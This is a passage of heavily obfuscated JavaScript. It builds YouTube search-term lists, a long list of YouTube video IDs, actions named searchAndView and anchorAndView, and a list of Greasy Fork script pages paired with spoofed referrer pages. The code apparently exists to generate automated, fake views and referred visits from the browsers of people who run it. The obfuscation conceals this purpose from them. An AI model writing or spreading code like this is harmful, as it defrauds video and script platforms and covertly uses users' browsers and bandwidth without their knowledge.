't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1b41 + 0x1 * 0x679 + -0x16 * 0x188)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1d7c + 0x2c2 * -0x1 + -0x1ab0)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + T(0x12) + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xc6b + 0x4eb * -0x2 + -0x292);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    U(0xf, 'jJ%o') + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + U(0x5, 'ntB8') + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + T(0x7) + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + V(0xd) + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + V(0x10)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + T(0x6) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
